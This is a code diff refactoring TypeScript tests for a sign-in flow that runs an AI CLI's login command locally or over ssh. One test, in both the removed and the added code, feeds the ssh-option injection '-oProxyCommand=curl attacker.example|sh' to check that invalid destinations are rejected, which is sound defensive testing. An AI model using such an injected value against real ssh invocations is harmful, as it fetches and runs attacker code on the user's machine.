@@ -59,95 +59,53 @@ suite('wisp: sign-in flow', () => {
 
 	ensureNoDisposablesAreLeakedInTestSuite();
 
-	test('opens a terminal running the CLI\'s login command on the local host', async () => {
+	function setup() {
 		const terminal = new FakeTerminalService();
 		const accounts = new FakeAccountsService();
 		const notifications = new FakeNotificationService();
 		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
+		const launched = () => {
+			const config = terminal.created[0].config;
+			assert.ok(config && 'executable' in config);
+			return [config.executable, ...config.args ?? []];
+		};
+		return { terminal, accounts, notifications, flow, launched };
+	}
 
-		await flow.run(cli({ cli: 'claude' }), 'local');
+	test('opens a terminal running the CLI\'s login command, locally or over ssh', async () => {
+		const local = setup();
+		await local.flow.run(cli({ cli: 'claude' }), 'local');
+		assert.deepStrictEqual(local.launched(), ['claude', 'auth', 'login']);
+		assert.strictEqual(local.notifications.errors.length, 0);
 
-		assert.strictEqual(terminal.created.length, 1);
-		assert.strictEqual(terminal.created[0].config && 'executable' in terminal.created[0].config ? terminal.created[0].config.executable : undefined, 'claude');
-		assert.deepStrictEqual(terminal.created[0].config && 'args' in terminal.created[0].config ? terminal.created[0].config.args : undefined, ['auth', 'login']);
-		assert.strictEqual(notifications.errors.length, 0);
-		terminal.fireExit(0);
+		const remote = setup();
+		await remote.flow.run(cli({ cli: 'cursor' }), 'mac-mini');
+		assert.deepStrictEqual(remote.launched(), ['ssh', '-t', '--', 'mac-mini', 'env', 'NO_OPEN_BROWSER=1', 'agent', 'login']);
+		local.terminal.fireExit(0);
+		remote.terminal.fireExit(0);
 	});
 
-	test('builds the ssh command for a remote host', async () => {
-		const terminal = new FakeTerminalService();
-		const accounts = new FakeAccountsService();
-		const notifications = new FakeNotificationService();
-		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
-
-		await flow.run(cli({ cli: 'cursor' }), 'mac-mini');
-
-		const config = terminal.created[0].config;
-		assert.ok(config && 'executable' in config);
-		assert.strictEqual(config.executable, 'ssh');
-		assert.deepStrictEqual(config.args, ['-t', '--', 'mac-mini', 'env', 'NO_OPEN_BROWSER=1', 'agent', 'login']);
-		terminal.fireExit(0);
+	test('refreshes the detected CLIs once the terminal exits, whatever the exit code, and only once', async () => {
+		for (const code of [0, undefined]) {
+			const { terminal, accounts, flow } = setup();
+			await flow.run(cli(), 'local');
+			assert.strictEqual(accounts.refreshCalls, 0);
+			terminal.fireExit(code);
+			terminal.fireExit(code);
+			assert.strictEqual(accounts.refreshCalls, 1);
+		}
 	});
 
-	test('refreshes the detected CLIs once the terminal exits, whatever the exit code', async () => {
-		const terminal = new FakeTerminalService();
-		const accounts = new FakeAccountsService();
-		const notifications = new FakeNotificationService();
-		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
+	test('an invalid ssh destination, or a terminal that fails to open, shows a notification instead', async () => {
+		const invalid = setup();
+		await invalid.flow.run(cli(), '-oProxyCommand=curl attacker.example|sh');
+		assert.strictEqual(invalid.terminal.created.length, 0);
+		assert.strictEqual(invalid.notifications.errors.length, 1);
 
-		await flow.run(cli(), 'local');
-		assert.strictEqual(accounts.refreshCalls, 0);
-
-		terminal.fireExit(0);
-		assert.strictEqual(accounts.refreshCalls, 1);
-	});
-
-	test('refreshes on exit even when the user closes the terminal instead of the CLI exiting on its own', async () => {
-		const terminal = new FakeTerminalService();
-		const accounts = new FakeAccountsService();
-		const notifications = new FakeNotificationService();
-		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
-
-		await flow.run(cli(), 'local');
-		terminal.fireExit(undefined);
-		assert.strictEqual(accounts.refreshCalls, 1);
-	});
-
-	test('a second exit of the same terminal does not refresh again', async () => {
-		const terminal = new FakeTerminalService();
-		const accounts = new FakeAccountsService();
-		const notifications = new FakeNotificationService();
-		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
-
-		await flow.run(cli(), 'local');
-		terminal.fireExit(0);
-		terminal.fireExit(0);
-		assert.strictEqual(accounts.refreshCalls, 1);
-	});
-
-	test('an invalid ssh destination shows a notification and never opens a terminal', async () => {
-		const terminal = new FakeTerminalService();
-		const accounts = new FakeAccountsService();
-		const notifications = new FakeNotificationService();
-		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
-
-		await flow.run(cli(), '-oProxyCommand=curl attacker.example|sh');
-
-		assert.strictEqual(terminal.created.length, 0);
-		assert.strictEqual(notifications.errors.length, 1);
-		assert.strictEqual(accounts.refreshCalls, 0);
-	});
-
-	test('a terminal that fails to open shows a notification instead of throwing', async () => {
-		const terminal = new FakeTerminalService();
-		terminal.failNextCreate();
-		const accounts = new FakeAccountsService();
-		const notifications = new FakeNotificationService();
-		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
-
-		await flow.run(cli(), 'local');
-
-		assert.strictEqual(notifications.errors.length, 1);
-		assert.strictEqual(accounts.refreshCalls, 0);
+		const failing = setup();
+		failing.terminal.failNextCreate();
+		await failing.flow.run(cli(), 'local');
+		assert.strictEqual(failing.notifications.errors.length, 1);
+		assert.strictEqual(failing.accounts.refreshCalls, 0);
 	});
 });
